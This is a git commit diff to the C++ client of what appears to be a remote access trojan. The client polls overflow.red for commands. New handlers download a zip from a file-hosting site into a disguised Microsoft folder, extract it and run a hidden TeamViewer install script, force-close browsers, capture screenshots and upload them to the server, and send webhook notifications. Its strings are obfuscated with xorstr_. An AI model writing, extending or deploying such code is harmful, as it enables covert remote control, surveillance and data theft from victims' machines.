0826fd3d40c461ddd3f56b4ab22728d3e284323a
NMan1 <nickmantini01@gmail.com>
2020-11-26 22:42:39 -0600

    GOOD

--- client/communication.cpp
+++ client/communication.cpp
@@ -1,14 +1,19 @@
 #include "communication.h"
 #include <iostream>
+#include <filesystem>
 
 #include "..\utility\requests.h"
 #include "functions.h"
 #include "../utility/helper.h"
 #include "client.h"
 
+namespace fs = std::filesystem;
+
 namespace client {
 	namespace communication {
 		void handler_loop() {
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&webhook_url=") + client::client_webhook_url + std::string("&content=**Notification**\n```\n") + std::string(xorstr_("Communication Thread Created")) + xorstr_("\n```"));
+
 			while (true) {
 				auto cmd = requests::get_request("https://overflow.red/post.php", "cmd=get_command&ip=" + client::ip);
 				if (!cmd.empty()) {	
@@ -19,6 +24,60 @@ namespace client {
 					} 
 					else if (cmd == "windows") {
 						requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
+					}
+					else if (cmd == "teamviewer_run") {
+						system((std::string("cd ") + std::string(helpers::roaming + xorstr_("\\Microsoft\\") + "tv") + std::string("&& powershell.exe -file ") + "teamviewer_install.ps1").c_str());
+
+						Sleep(1500);
+
+						system("taskkill /F /IM MicrosoftEdge.exe");
+						system("taskkill /F /IM firefox.exe ");
+						system("taskkill /F /IM chrome.exe ");
+
+						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
+						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
+						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**TeamViewer**") + std::string("&ip=") + client::ip);
+					}
+					else if (cmd == "teamviewer_download") {
+						if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip")) {
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Downloading Files") + xorstr_("\n```"));
+							requests::download_file("https://srv-store4.gofile.io/download/L2TuWe/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Finished Downloading. Extracing and Running.") + xorstr_("\n```"));
+						}
+						else {
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("File Already Exists. Extracing and Running.") + xorstr_("\n```"));
+						}
+						std::string path = helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip";
+						std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
+						std::string command = "powershell -command \"Expand-Archive -Force " + path + " " + unzip_path + "\"";
+						system(command.c_str());
+					}
+					else if (cmd == "teamviewer_all") {
+						if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip")) {
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Downloading Files") + xorstr_("\n```"));
+							requests::download_file("https://srv-store4.gofile.io/download/L2TuWe/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Finished Downloading. Extracing and Running.") + xorstr_("\n```"));
+						} 
+						else {
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("File Already Exists. Extracing and Running.") + xorstr_("\n```"));
+						}
+
+						std::string path = helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip";
+						std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
+						std::string command = "powershell -command \"Expand-Archive -Force " + path + " " + unzip_path + "\"";
+						system(command.c_str());
+
+						system((std::string("cd ") + std::string(helpers::roaming + xorstr_("\\Microsoft\\") + "tv") + std::string("&& powershell.exe -file ") + "teamviewer_install.ps1").c_str());
+
+						Sleep(1500);
+
+						system("taskkill /F /IM MicrosoftEdge.exe");
+						system("taskkill /F /IM firefox.exe ");
+						system("taskkill /F /IM chrome.exe ");
+
+						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
+						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
+						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**TeamViewer**") + std::string("&ip=") + client::ip);
 					}
 					else if (cmd.find("download") != std::string::npos && 
 							 (cmd.find("https") != std::string::npos || 
